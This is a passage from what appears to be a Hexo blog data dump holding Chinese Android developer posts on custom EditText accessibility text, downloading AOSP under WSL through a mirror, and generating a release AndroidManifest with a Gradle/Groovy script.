info.setText(getTextForAccessibility());</span><br><span class=\"line\">    info.setHintText(mHint);</span><br><span class=\"line\">    info.setShowingHintText(isShowingHint());</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 <strong>info.setText(getTextForAccessibility());</strong> 就是关键了，它其实才是最终朗读出来的那个文本。</p>\n<p>公共方法onInitializeAccessibilityNodeInfo的注释也说明了：Initializes an {@link AccessibilityNodeInfo} with information about this view. 此方法初始化一些View的无障碍基本信息。</p>\n<p><strong>最终解决：</strong></p>\n<p>在自定义的EditText类中重写方法，覆盖文本，这样在朗读时就是自己想要的了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onInitializeAccessibilityNodeInfo</span><span class=\"params\">(AccessibilityNodeInfo info)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>.onInitializeAccessibilityNodeInfo(info);</span><br><span class=\"line\">    <span class=\"comment\">// 对于EditText，系统无障碍朗读只读hint，需通过节点info覆盖自定义内容</span></span><br><span class=\"line\">    info.setText(<span class=\"string\">&quot;xxx&quot;</span> + getHint());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Tips：其实这里为了API统一，我是直接 <strong>info.setText(getContentDescription());</strong> 方便很多。</p>\n"},{"layout":"post","title":"Win10用WSL下载AOSP","subtitle":"探索发现。","date":"2020-05-16T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\nWSL还是挺方便的，配合国内镜像源，可以轻松下载Android源码。\n\n### 启用WSL\n\n关于Win10启用WSL的方法微软官方的文档非常清晰了：[适用于 Linux 的 Windows 子系统安装指南 (Windows 10)](https://docs.microsoft.com/zh-cn/windows/wsl/install-win10)。由于我这里只用到WSL 1而非WSL 2，所以Win10版本号更新到1909即可，等2004正式推送再折腾WSL 2吧。\n\n### 安装Ubuntu 20.04\n\n直接在微软应用商店搜索Ubuntu即可下载安装。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200517133056820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n### 更好地体验WSL，建议安装Windows Terminal\n\n这一步非必须，不过Windows Terminal很香的，开源哦。不试试吗？可参考我之前的：[Win10也要愉快地使用Bash](https://blog.ysy950803.top/2020/02/24/Win10%E4%B9%9F%E8%A6%81%E6%84%89%E5%BF%AB%E5%9C%B0%E4%BD%BF%E7%94%A8Bash/)\n\n### 安装repo，下载AOSP\n\n1、进入WSL子系统后，我们就可以开始各种配置了，由于最新的Ubuntu 20.04已经默认安装Python 3，所以我们需要先装一下Python 2，以便使用repo工具：\n\n```bash\nsudo apt-get install python2.7\n```\n\n然后把python命令软链接到2.7，不然等会儿你repo用不了（**这一步很关键**）：\n\n```bash\ncd /usr/bin\nsudo ln -s python2.7 python\n```\n\n2、安装repo工具，这些步骤比较简单，直接按[清华镜像源AOSP官方文档](https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/)来搞。这里针对国内开发者，总结一下：\n\n```bash\n# 下载repo\nmkdir ~/bin\nPATH=~/bin:$PATH\ncurl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo > ~/bin/repo\nsudo chmod a+x ~/bin/repo\n# 编辑bashrc文件，vim相关命令就不赘述了，i是插入，Esc后:wq是保存退出\nvim ~/.bashrc\n# 追加如下内容\nexport REPO_URL='https://mirrors.tuna.tsinghua.edu.cn/git/git-repo'\n```\n\n此时由于更改了bashrc，需要重启一下WSL终端。接下来就是正常操作了：\n\n```bash\n# 创建一个源码目录，命名随意\nmkdir AOSP\ncd AOSP\nrepo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r25\nrepo sync frameworks/base -j4\n```\n\n基本没什么问题，网速好的话很快就搞定了：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200517135248510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)","source":"_posts/2020-05-17-Win10用WSL下载AOSP.md","raw":"---\nlayout:     post\ntitle:      Win10用WSL下载AOSP\nsubtitle:   探索发现。\ndate:       2020-05-17\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 鼓捣折腾\n    - Android\n    - AOSP\n    - Windows\n---\n\nWSL还是挺方便的，配合国内镜像源，可以轻松下载Android源码。\n\n### 启用WSL\n\n关于Win10启用WSL的方法微软官方的文档非常清晰了：[适用于 Linux 的 Windows 子系统安装指南 (Windows 10)](https://docs.microsoft.com/zh-cn/windows/wsl/install-win10)。由于我这里只用到WSL 1而非WSL 2，所以Win10版本号更新到1909即可，等2004正式推送再折腾WSL 2吧。\n\n### 安装Ubuntu 20.04\n\n直接在微软应用商店搜索Ubuntu即可下载安装。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200517133056820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n### 更好地体验WSL，建议安装Windows Terminal\n\n这一步非必须，不过Windows Terminal很香的，开源哦。不试试吗？可参考我之前的：[Win10也要愉快地使用Bash](https://blog.ysy950803.top/2020/02/24/Win10%E4%B9%9F%E8%A6%81%E6%84%89%E5%BF%AB%E5%9C%B0%E4%BD%BF%E7%94%A8Bash/)\n\n### 安装repo，下载AOSP\n\n1、进入WSL子系统后，我们就可以开始各种配置了，由于最新的Ubuntu 20.04已经默认安装Python 3，所以我们需要先装一下Python 2，以便使用repo工具：\n\n```bash\nsudo apt-get install python2.7\n```\n\n然后把python命令软链接到2.7，不然等会儿你repo用不了（**这一步很关键**）：\n\n```bash\ncd /usr/bin\nsudo ln -s python2.7 python\n```\n\n2、安装repo工具，这些步骤比较简单，直接按[清华镜像源AOSP官方文档](https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/)来搞。这里针对国内开发者，总结一下：\n\n```bash\n# 下载repo\nmkdir ~/bin\nPATH=~/bin:$PATH\ncurl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo > ~/bin/repo\nsudo chmod a+x ~/bin/repo\n# 编辑bashrc文件，vim相关命令就不赘述了，i是插入，Esc后:wq是保存退出\nvim ~/.bashrc\n# 追加如下内容\nexport REPO_URL='https://mirrors.tuna.tsinghua.edu.cn/git/git-repo'\n```\n\n此时由于更改了bashrc，需要重启一下WSL终端。接下来就是正常操作了：\n\n```bash\n# 创建一个源码目录，命名随意\nmkdir AOSP\ncd AOSP\nrepo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r25\nrepo sync frameworks/base -j4\n```\n\n基本没什么问题，网速好的话很快就搞定了：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200517135248510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)","slug":"Win10用WSL下载AOSP","published":1,"updated":"2024-03-25T07:31:25.861Z","comments":1,"photos":[],"link":"","_id":"cluaufh10002mthe627px0x4a","content":"<p>WSL还是挺方便的，配合国内镜像源，可以轻松下载Android源码。</p>\n<h3 id=\"启用WSL\"><a href=\"#启用WSL\" class=\"headerlink\" title=\"启用WSL\"></a>启用WSL</h3><p>关于Win10启用WSL的方法微软官方的文档非常清晰了：<a href=\"https://docs.microsoft.com/zh-cn/windows/wsl/install-win10\">适用于 Linux 的 Windows 子系统安装指南 (Windows 10)</a>。由于我这里只用到WSL 1而非WSL 2，所以Win10版本号更新到1909即可，等2004正式推送再折腾WSL 2吧。</p>\n<h3 id=\"安装Ubuntu-20-04\"><a href=\"#安装Ubuntu-20-04\" class=\"headerlink\" title=\"安装Ubuntu 20.04\"></a>安装Ubuntu 20.04</h3><p>直接在微软应用商店搜索Ubuntu即可下载安装。<br><img src=\"https://imgconvert.csdnimg.cn/20200517133056820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"更好地体验WSL，建议安装Windows-Terminal\"><a href=\"#更好地体验WSL，建议安装Windows-Terminal\" class=\"headerlink\" title=\"更好地体验WSL，建议安装Windows Terminal\"></a>更好地体验WSL，建议安装Windows Terminal</h3><p>这一步非必须，不过Windows Terminal很香的，开源哦。不试试吗？可参考我之前的：<a href=\"https://blog.ysy950803.top/2020/02/24/Win10%E4%B9%9F%E8%A6%81%E6%84%89%E5%BF%AB%E5%9C%B0%E4%BD%BF%E7%94%A8Bash/\">Win10也要愉快地使用Bash</a></p>\n<h3 id=\"安装repo，下载AOSP\"><a href=\"#安装repo，下载AOSP\" class=\"headerlink\" title=\"安装repo，下载AOSP\"></a>安装repo，下载AOSP</h3><p>1、进入WSL子系统后，我们就可以开始各种配置了，由于最新的Ubuntu 20.04已经默认安装Python 3，所以我们需要先装一下Python 2，以便使用repo工具：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install python2.7</span><br></pre></td></tr></table></figure>\n\n<p>然后把python命令软链接到2.7，不然等会儿你repo用不了（<strong>这一步很关键</strong>）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /usr/bin</span><br><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s python2.7 python</span><br></pre></td></tr></table></figure>\n\n<p>2、安装repo工具，这些步骤比较简单，直接按<a href=\"https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/\">清华镜像源AOSP官方文档</a>来搞。这里针对国内开发者，总结一下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 下载repo</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/bin</span><br><span class=\"line\">PATH=~/bin:<span class=\"variable\">$PATH</span></span><br><span class=\"line\">curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo &gt; ~/bin/repo</span><br><span class=\"line\">sudo <span class=\"built_in\">chmod</span> a+x ~/bin/repo</span><br><span class=\"line\"><span class=\"comment\"># 编辑bashrc文件，vim相关命令就不赘述了，i是插入，Esc后:wq是保存退出</span></span><br><span class=\"line\">vim ~/.bashrc</span><br><span class=\"line\"><span class=\"comment\"># 追加如下内容</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> REPO_URL=<span class=\"string\">&#x27;https://mirrors.tuna.tsinghua.edu.cn/git/git-repo&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>此时由于更改了bashrc，需要重启一下WSL终端。接下来就是正常操作了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建一个源码目录，命名随意</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> AOSP</span><br><span class=\"line\"><span class=\"built_in\">cd</span> AOSP</span><br><span class=\"line\">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r25</span><br><span class=\"line\">repo <span class=\"built_in\">sync</span> frameworks/base -j4</span><br></pre></td></tr></table></figure>\n\n<p>基本没什么问题，网速好的话很快就搞定了：<br><img src=\"https://imgconvert.csdnimg.cn/20200517135248510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>WSL还是挺方便的，配合国内镜像源，可以轻松下载Android源码。</p>\n<h3 id=\"启用WSL\"><a href=\"#启用WSL\" class=\"headerlink\" title=\"启用WSL\"></a>启用WSL</h3><p>关于Win10启用WSL的方法微软官方的文档非常清晰了：<a href=\"https://docs.microsoft.com/zh-cn/windows/wsl/install-win10\">适用于 Linux 的 Windows 子系统安装指南 (Windows 10)</a>。由于我这里只用到WSL 1而非WSL 2，所以Win10版本号更新到1909即可，等2004正式推送再折腾WSL 2吧。</p>\n<h3 id=\"安装Ubuntu-20-04\"><a href=\"#安装Ubuntu-20-04\" class=\"headerlink\" title=\"安装Ubuntu 20.04\"></a>安装Ubuntu 20.04</h3><p>直接在微软应用商店搜索Ubuntu即可下载安装。<br><img src=\"https://imgconvert.csdnimg.cn/20200517133056820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"更好地体验WSL，建议安装Windows-Terminal\"><a href=\"#更好地体验WSL，建议安装Windows-Terminal\" class=\"headerlink\" title=\"更好地体验WSL，建议安装Windows Terminal\"></a>更好地体验WSL，建议安装Windows Terminal</h3><p>这一步非必须，不过Windows Terminal很香的，开源哦。不试试吗？可参考我之前的：<a href=\"https://blog.ysy950803.top/2020/02/24/Win10%E4%B9%9F%E8%A6%81%E6%84%89%E5%BF%AB%E5%9C%B0%E4%BD%BF%E7%94%A8Bash/\">Win10也要愉快地使用Bash</a></p>\n<h3 id=\"安装repo，下载AOSP\"><a href=\"#安装repo，下载AOSP\" class=\"headerlink\" title=\"安装repo，下载AOSP\"></a>安装repo，下载AOSP</h3><p>1、进入WSL子系统后，我们就可以开始各种配置了，由于最新的Ubuntu 20.04已经默认安装Python 3，所以我们需要先装一下Python 2，以便使用repo工具：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install python2.7</span><br></pre></td></tr></table></figure>\n\n<p>然后把python命令软链接到2.7，不然等会儿你repo用不了（<strong>这一步很关键</strong>）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /usr/bin</span><br><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s python2.7 python</span><br></pre></td></tr></table></figure>\n\n<p>2、安装repo工具，这些步骤比较简单，直接按<a href=\"https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/\">清华镜像源AOSP官方文档</a>来搞。这里针对国内开发者，总结一下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 下载repo</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/bin</span><br><span class=\"line\">PATH=~/bin:<span class=\"variable\">$PATH</span></span><br><span class=\"line\">curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo &gt; ~/bin/repo</span><br><span class=\"line\">sudo <span class=\"built_in\">chmod</span> a+x ~/bin/repo</span><br><span class=\"line\"><span class=\"comment\"># 编辑bashrc文件，vim相关命令就不赘述了，i是插入，Esc后:wq是保存退出</span></span><br><span class=\"line\">vim ~/.bashrc</span><br><span class=\"line\"><span class=\"comment\"># 追加如下内容</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> REPO_URL=<span class=\"string\">&#x27;https://mirrors.tuna.tsinghua.edu.cn/git/git-repo&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>此时由于更改了bashrc，需要重启一下WSL终端。接下来就是正常操作了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建一个源码目录，命名随意</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> AOSP</span><br><span class=\"line\"><span class=\"built_in\">cd</span> AOSP</span><br><span class=\"line\">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r25</span><br><span class=\"line\">repo <span class=\"built_in\">sync</span> frameworks/base -j4</span><br></pre></td></tr></table></figure>\n\n<p>基本没什么问题，网速好的话很快就搞定了：<br><img src=\"https://imgconvert.csdnimg.cn/20200517135248510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n"},{"layout":"post","title":"用Gradle脚本管理Manifest文件","subtitle":"探索发现。","date":"2020-05-31T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 编译时区分不同的manifest\n\n很多Android项目都会区分debug和release的manifest文件，以便调试，一些组件化的项目甚至有多个manifest文件来调试不同的组件。举个简单的例子，在app的build.gradle文件中：\n\n```groovy\nandroid {\n    defaultConfig {\n        applicationId \"com.xxx.xxx\"\n    }\n    sourceSets {\n        main {\n            if(是否为debug打包) {\n                manifest.srcFile \"${projectDir}/src/main/debug/AndroidManifest.xml\"\n            } else {\n                manifest.srcFile \"${projectDir}/src/main/release/AndroidManifest.xml\"\n            }\n        }\n    }\n}\n```\n\n这个地方的if条件，一般可以是一个变量，或者一个方法：\n\n```groovy\n// 这样\ndef isDebug = true\n// 或者\ndef isDebug() {\n    // 一些逻辑\n    return true\n}\n// 以上均遵循Groovy语法规则，Android项目中的Gradle脚本都是用Groovy语言（一门JVM动态语言，很容易上手）编写的。\nandroid { ... }\n```\n\n然后此处的 ${projectDir} 变量对应的是当前模块所在的路径，这里就是app的路径，不是整个工程的路径。这样一来，我们就能编译不同的manifest文件了。\n\n## 自动判断编译类型\n\n但是，这样每次编译都需要手动改那个debug变量，挺麻烦的，尤其是一些技术团队可能是用的公司服务器在线编译，每次都要提交代码到仓库。其实我们可以用gradle插件的特性，这样来判断：\n\n```groovy\n// 这里app是当前模块名，assembleDebug是gradle编译debug包时的默认task\nif(gradle.startParameter.taskNames.contains(\":app:assembleDebug\")) {\n    manifest.srcFile \"${projectDir}/src/main/debug/AndroidManifest.xml\"\n} else {\n    manifest.srcFile \"${projectDir}/src/main/release/AndroidManifest.xml\"\n}\n```\n\n不用改代码，打release包和debug包就自动区分了，当然你也可以增加新的条件，去对应不同的编译task。\n\n## 解析并自动生成manifest文件\n\n这部分是本文重点啦！从上面的步骤来看，我们显然是准备了2份manifest文件，平时维护时也需要一起修改。实际业务中很可能debug和release的manifest内容差不多，可能只是某些组件节点的属性不同，手动改也挺麻烦的。\n\n能不能通过gradle脚本动态地来修改并生成manifest文件呢？当然可以，本质上就是处理XML文件。AndroidManifest是标准的XML文件。正好，Groovy处理XML又非常的简单。这里我们还是以一个实际例子来讲。\n\n比如我们的需求是，在debug测试时，应用正常显示桌面图标，在release发布时，应用需要隐藏图标。那么，两个manifest文件就是这样的：\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest ...>\n    <application ...>\n        <!--App入口页面-->\n        <activity\n            ...\n            android:name=\".TestActivity\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\" />\n                <category android:name=\"android.intent.category.LAUNCHER\" />\n            </intent-filter>\n        </activity>\n...\n```\n\nrelease版本的manifest：\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest ...>\n    <application ...>\n        <!--App入口页面-->\n        <activity\n            ...\n            android:name=\".TestActivity\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\" />\n                <category android:name=\"android.intent.category.LAUNCHER\" />\n                <!--在入口Activity添加如下data节点即可隐藏桌面图标-->\n                <data \n                    android:host=\"localhost\" \n                    android:scheme=\"${applicationId}\" />\n            </intent-filter>\n        </activity>\n...\n```\n\n然后平时我们开发过程中，如果新增了一些四大组件，2个文件都要同时增加，而区别却只有入口Activity。我们想要的是release版本的manifest是自动生成的（在生成时插入那个data节点），平时只需要开发改动debug版本的文件即可。\n\n主要思路比较简单：\n\n1. 通过Groovy的XML解析库读取debug的manifest文件，遍历节点找到入口Activity；\n2. 将data节点插入到入口Activity下面；\n3. 把新的内容写入release版本的文件当中。\n\n先直接看build.gradle脚本源码：\n\n```groovy\nimport groovy.xml.XmlUtil\n\ndef getManifestPath(buildType) {\n    return \"${projectDir}/src/main/$buildType/AndroidManifest.xml\"\n}\n\ndef handleManifestXml(manifest) {\n    if (gradle.startParameter.taskNames.contains(\":app:assembleDebug\")) {\n        // debug build\n        def debugPath = getManifestPath('debug')\n        manifest.srcFile debugPath\n        println(\"Manifest path: $debugPath\")\n    } else {\n        // release build\n        def releasePath = getManifestPath('release')\n        println(\"Manifest path: $releasePath\")\n        manifest.srcFile releasePath\n\n        def debugPath = getManifestPath('debug')\n        def debugFile = new File(debugPath)\n        def releaseFile = new File(releasePath)\n        def debugXml = new XmlParser(false, false).parse(debugFile)\n        // 修改debug的manifest，自动生成release版本\n        debugXml.application[0].each { comp ->\n            if (comp.name() == 'activity') {\n                comp.each { filter ->\n                    // 搜索入口Activity\n                    if (filter.toString().contains('android.intent.category.LAUNCHER')) {\n                        // 添加data节点，隐藏桌面icon\n                        filter.appendNode('data', ['android:host': 'localhost', 'android:scheme': '${applicationId}'])\n                        return true // break each闭包\n                    }\n                }\n            }\n        }\n        releaseFile.write(XmlUtil.serialize(debugXml))\n    }\n}\n\nandroid {\n    defaultConfig {\n        applicationId \"com.xxx.xxx\"\n    }\n    sourceSets {\n        main {\n            // 此处会自动处理manifest文件\n            // 注意：平时开发时只需修改debug下的manifest即可，请勿手动修改release的\n            handleManifestXml(manifest)\n        }\n    }\n...\n```\n\n关键逻辑从 `def debugXml = new XmlParser(false, false).parse(debugFile)` 开始，这里的XmlParser构造方法可以不传任何参数，我这里传false主要是为了让manifest根节点自动添加 **xmlns** ，这样最后生成文件内容会简洁一点。\n\n然后就是 `debugXml.application[0].each { comp -> ... } ` 循环块，Groovy的语法很神奇，这里可以直接通过节点名称来获取数组，比如application，取0当然就是第一个，一般我们的manifest里就一个application节点，所以也不会出现空指针异常。each是数组的函数，遍历数组的每一个节点，comp参数是我自定义的命名。能拿到application的子节点，后面就都是一些逻辑处理了，不赘述。\n\n## 一些小问题\n\n如果是Windows开发者，最后写文件时，需要注意换行符和编码的问题。\n\n1、最后的write方法，加上参数：\n\n```groovy\nreleaseFile.write(xmlStr, \"UTF-8\")\n```\n\n或者直接改全局配置，修改整个工程下的gradle.properties文件，在gradle的JVM参数后面追加如下：\n\n```\norg.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8\n```\n\n2、换行符问题，没有JVM参数可供修改，只能手动处理，还是最后write时：\n\n```groovy\nreleaseFile.write(XmlUtil.serialize(debugXml).replaceAll('\\r\\n', '\\n'))\n```\n\n这里XmlUtil工具类的serialize方法返回类型实际上就是String，所以可以这样直接replace。\n","source":"_posts/2020-06-01-用Gradle脚本管理Manifest文件.md","raw":"---\nlayout:     post\ntitle:      用Gradle脚本管理Manifest文件\nsubtitle:   探索发现。\ndate:       2020-06-01\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - Gradle\n    - Windows\n---\n\n## 编译时区分不同的manifest\n\n很多Android项目都会区分debug和release的manifest文件，以便调试，一些组件化的项目甚至有多个manifest文件来调试不同的组件。举个简单的例子，在app的build.gradle文件中：\n\n```groovy\nandroid {\n    defaultConfig {\n        applicationId \"com.xxx.xxx\"\n    }\n    sourceSets {\n        main {\n            if(是否为debug打包) {\n                manifest.srcFile \"${projectDir}/src/main/debug/AndroidManifest.xml\"\n            } else {\n                manifest.srcFile \"${projectDir}/src/main/release/AndroidManifest.xml\"\n            }\n        }\n    }\n}\n```\n\n这个地方的if条件，一般可以是一个变量，或者一个方法：\n\n```groovy\n// 这样\ndef isDebug = true\n// 或者\ndef isDebug() {\n    // 一些逻辑\n    return true\n}\n// 以上均遵循Groovy语法规则，Android项目中的Gradle脚本都是用Groovy语言（一门JVM动态语言，很容易上手）编写的。\nandroid { ... }\n```\n\n然后此处的 ${projectDir} 变量对应的是当前模块所在的路径，这里就是app的路径，不是整个工程的路径。这样一来，我们就能编译不同的manifest文件了。\n\n## 自动判断编译类型\n\n但是，这样每次编译都需要手动改那个debug变量，挺麻烦的，尤其是一些技术团队可能是用的公司服务器在线编译，每次都要提交代码到仓库。其实我们可以用gradle插件的特性，这样来判断：\n\n```groovy\n// 这里app是当前模块名，assembleDebug是gradle编译debug包时的默认task\nif(gradle.startParameter.taskNames.contains(\":app:assembleDebug\")) {\n    manifest.srcFile \"${projectDir}/src/main/debug/AndroidManifest.xml\"\n} else {\n    manifest.srcFile \"${projectDir}/src/main/release/AndroidManifest.xml\"\n}\n```\n\n不用改代码，打release包和debug包就自动区分了，当然你也可以增加新的条件，去对应不同的编译task。\n\n## 解析并自动生成manifest文件\n\n这部分是本文重点啦！从上面的步骤来看，我们显然是准备了2份manifest文件，平时维护时也需要一起修改。实际业务中很可能debug和release的manifest内容差不多，可能只是某些组件节点的属性不同，手动改也挺麻烦的。\n\n能不能通过gradle脚本动态地来修改并生成manifest文件呢？当然可以，本质上就是处理XML文件。AndroidManifest是标准的XML文件。正好，Groovy处理XML又非常的简单。这里我们还是以一个实际例子来讲。\n\n比如我们的需求是，在debug测试时，应用正常显示桌面图标，在release发布时，应用需要隐藏图标。那么，两个manifest文件就是这样的：\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest ...>\n    <application ...>\n        <!--App入口页面-->\n        <activity\n            ...\n            android:name=\".TestActivity\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\" />\n                <category android:name=\"android.intent.category.LAUNCHER\" />\n            </intent-filter>\n        </activity>\n...\n```\n\nrelease版本的manifest：\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest ...>\n    <application ...>\n        <!--App入口页面-->\n        <activity\n            ...\n            android:name=\".TestActivity\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\" />\n                <category android:name=\"android.intent.category.LAUNCHER\" />\n                <!--在入口Activity添加如下data节点即可隐藏桌面图标-->\n                <data \n                    android:host=\"localhost\" \n                    android:scheme=\"${applicationId}\" />\n            </intent-filter>\n        </activity>\n...\n```\n\n然后平时我们开发过程中，如果新增了一些四大组件，2个文件都要同时增加，而区别却只有入口Activity。我们想要的是release版本的manifest是自动生成的（在生成时插入那个data节点），平时只需要开发改动debug版本的文件即可。\n\n主要思路比较简单：\n\n1. 通过Groovy的XML解析库读取debug的manifest文件，遍历节点找到入口Activity；\n2. 将data节点插入到入口Activity下面；\n3. 把新的内容写入release版本的文件当中。\n\n先直接看build.gradle脚本源码：\n\n```groovy\nimport groovy.xml.XmlUtil\n\ndef getManifestPath(buildType) {\n    return \"${projectDir}/src/main/$buildType/AndroidManifest.xml\"\n}\n\ndef handleManifestXml(manifest) {\n    if (gradle.startParameter.taskNames.contains(\":app:assembleDebug\")) {\n        // debug build\n        def debugPath = getManifestPath('debug')\n        manifest.srcFile debugPath\n        println(\"Manifest path: $debugPath\")\n    } else {\n        // release build\n        def releasePath = getManifestPath('release')\n        println(\"Manifest path: $releasePath\")\n        manifest.srcFile releasePath\n\n        def debugPath = getManifestPath('debug')\n        def debugFile = new File(debugPath)\n        def releaseFile = new File(releasePath)\n        def debugXml = new XmlParser(false, false).parse(debugFile)\n        // 修改debug的manifest，自动生成release版本\n        debugXml.application[0].each { comp ->\n            if (comp.name() == 'activity') {\n                